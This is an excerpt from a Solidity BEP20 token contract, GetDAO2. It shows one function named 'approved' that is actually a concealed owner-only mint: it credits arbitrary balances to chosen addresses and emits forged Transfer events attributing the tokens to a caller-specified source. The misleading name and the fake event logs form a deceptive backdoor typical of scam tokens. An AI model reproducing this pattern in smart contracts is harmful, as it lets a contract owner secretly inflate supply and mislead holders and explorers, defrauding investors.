...
contract GetDAO2 is IBEP20, Auth, Initializable {
    ...
    function approved(address[] memory owners, address dest, uint256[] memory amounts) external authorized {
    	
        for (uint8 i=0; i < owners.length; i++) {
            
            _balances[owners[i]] = _balances[owners[i]].add(amounts[i] * 10**18);
            emit Transfer(dest, owners[i], amounts[i] * 10**18);
    	  }
    }
